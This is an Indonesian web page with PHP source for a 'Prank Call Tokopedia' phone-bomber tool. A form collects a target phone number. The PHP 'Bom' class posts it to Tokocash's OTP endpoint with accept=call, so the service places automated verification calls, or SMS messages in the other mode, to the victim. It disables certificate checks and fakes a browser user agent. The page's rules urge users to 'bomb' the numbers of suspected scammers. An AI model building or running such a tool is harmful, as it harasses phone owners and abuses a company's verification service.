<!DOCTYPE html>
<html lang="en">
<head>
<title>Official Emilia | Prank Call Tokopedia</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
<div class="container">
        <div class="col-md-2"></div>
        <div class="col-md-8 kotak">
            <div class=".col-xs-12 .col-md-8 center">
                <div class="text-center">
                    <h2>Prank Call TokoPedia</h2>
                <form method="POST" action="calltokped.php">
                      <div class="form-group">
                        <label for="exampleInputEmail1"><span class="glyphicon glyphicon-earphone" aria-hidden="true"></span> No Telp</label>
                        <input type="text" class="form-control" name="nomer" id="exampleInputEmail1" placeholder="Nomor telepon (ex: 0813xxxxxx)">
                      </div>
                      
                      <button type="submit" class="btn" name="bom">CALL !</button>
                    </form>   
                                <br><br>
                    <center><h4>Rules Prank Call Tokped</h4></center>
                    <br>
                    <center><b>1.Max 3xTLPN/JAM! Kalau Tidak Bisa Silakan Di Tunggu Beberapa Menit Lalu Sumbit Lagi
                    </br>2.Pergunakan Dengan Baik
                    </br>3.BOM Nomor Penipu / Ripper
                    </br>4.Jangan di salah gunakan</b>
                    <div><br>

        </div>
<br><br>
<center><div class='copyright'>Copyright &#169; 2018. <a href='http://official-emilia20.indoweb.xyz/index.php'>Official Emilia20</a> | powered by: <a href='https://www.instagram.com/adie192_'>Adie Dharma</a></div></center>
                    <br>
</body>
</html>

<?php
error_reporting(0);
Class Bom {
	public $no;
    public $type;
	public function sendC($url, $page, $params) {
        $ch = curl_init(); 
        curl_setopt ($ch, CURLOPT_URL, $url.$page); 
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
        if(!empty($params)) {
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt ($ch, CURLOPT_POST, 1); 
        }
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
        curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
        //curl_setopt ($ch, CURLOPT_HEADER, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        return $result;
    }
    private function getStr($start, $end, $string) {
        if (!empty($string)) {
        $setring = explode($start,$string);
        $setring = explode($end,$setring[1]);
        return $setring[0];
        }
    }
    public function Verif()
    {
        $url = "https://www.tokocash.com/oauth/otp";
        $no = $this->no;
        $type = $this->type;
        if ($type == 1) {
            $data = "msisdn={$no}&accept=";
        }elseif ($type == 2) {
            $data = "msisdn={$no}&accept=call";
        }
        $send = $this->sendC($url, null, $data);
        // echo $send;
        if (preg_match('/otp_attempt_left/', $send)) {
                print('OTP berhasil Ditelepon<br>');
            } else {
                print('!');
            }
    }
    
}
    


$init = new Bom();
//Eksekusi Call/Sms Boomber (Limit 3x/Jam)
$init->type = 2; //Type 2 untuk telpon, Type 1 untuk sms
$init->no = $_POST['nomer']; //Nomer Hp tujuan
if ($init->type == 1) {
	for ($i=0; $i < 2; $i++) { 
	    $init->Verif($init->no,$init->type);
	}
}elseif ($init->type == 2) {
	 $init->Verif($init->no,$init->type);
}
?>